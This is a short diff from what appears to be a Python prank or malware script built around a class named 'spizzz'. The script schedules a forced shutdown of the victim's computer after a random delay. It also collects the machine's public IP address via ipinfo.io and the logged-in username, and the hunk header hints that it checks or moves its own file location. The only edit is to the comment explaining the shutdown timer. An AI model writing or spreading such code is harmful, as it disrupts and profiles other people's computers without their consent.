@@ -18,7 +18,7 @@ elif __file__.replace('\\', '/') != path.replace('\\', '/'):
 
 class spizzz :
 
-    ticks = random.randint(300,1800) # Change the two random time limits to shut down the pc (example : ticks = random.randint(1,100) | there, the computer will shut down randomly between 1 and 10 seconds)
+    ticks = random.randint(300,1800) # Change the two random time limits to shut down the pc (example : ticks = random.randint(1,10) | there, the computer will shut down randomly between 1 and 10 seconds)
     ip = loads(urlopen(Request('http://ipinfo.io/json')).read())['ip']
     computer_username = getenv("username")
 
